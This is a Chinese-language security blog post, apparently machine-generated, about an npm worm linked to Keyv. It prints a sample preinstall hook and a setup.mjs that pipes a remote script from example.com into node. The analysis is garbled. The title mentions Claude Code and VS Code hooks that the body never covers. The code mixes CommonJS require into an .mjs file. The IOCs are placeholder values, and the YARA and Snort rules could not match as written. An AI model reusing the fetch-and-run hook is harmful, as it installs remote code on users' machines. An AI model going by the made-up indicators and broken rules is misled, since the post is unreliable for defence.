---
layout: post
title:  "Keyv-Linked npm Worm Poisons Hundreds of Packages, Plants Claude Code and VS Code Hooks"
date:   2026-08-04 19:22:08 +0000
categories: [security]
severity: critical
---

# 🚨 解析 npm 蠕蟲攻擊：Keyv 蠕蟲事件技術分析
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `npm` 生命週期腳本、`Bun` 執行環境、`GitHub Actions` 自動化工作流

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Keyv 蠕蟲攻擊的根源在於 `npm` 生命週期腳本的執行機制。攻擊者通過在 `package.json` 中添加 `preinstall` 腳本，實現了在安裝過程中執行惡意代碼。
* **攻擊流程圖解**:
  1. 攻擊者提交惡意 `package.json` 至 `npm` 注冊表。
  2. 使用者安裝受影響的套件時，`npm` 會執行 `preinstall` 腳本。
  3. 腳本下載並執行 `Bun` 執行環境，從而執行惡意代碼。
* **受影響元件**: `npm` 版本 12 以下、`Bun` 版本 1.3.13。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 `npm` 注冊表的寫入權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // package.json
    {
      "name": "keyv",
      "version": "6.0.0",
      "scripts": {
        "preinstall": "node setup.mjs"
      }
    }
    
    ```
```

javascript
// setup.mjs
const { exec } = require('child_process');
exec('curl -s https://example.com/malicious-code.js | node', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.log(`stderr: ${stderr}`);
});

```
* **繞過技術**: 攻擊者可以使用 `GitHub Actions` 自動化工作流來繞過 `npm` 的安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | example.com | /usr/local/lib/node_modules/keyv |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_package {
      meta:
        description = "Detects malicious package"
      strings:
        $a = "node setup.mjs"
      condition:
        $a at 0
    }
    
    ```
```

snort
alert tcp any any -> any 443 (msg:"Malicious package detected"; content:"node setup.mjs"; sid:1000001;)

```
* **緩解措施**: 更新 `npm` 至版本 12 以上，禁用 `preinstall` 腳本，使用 `npm` 的內建安全功能。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: 一個 Node.js 的套件管理工具，允許使用者安裝、更新和管理套件。
* **Bun (Bun.js)**: 一個 JavaScript 執行環境，允許使用者執行 JavaScript 代碼。
* **GitHub Actions**: 一個 GitHub 的自動化工作流工具，允許使用者定義和執行工作流。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/08/keyv-linked-npm-worm-poisons-hundreds.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


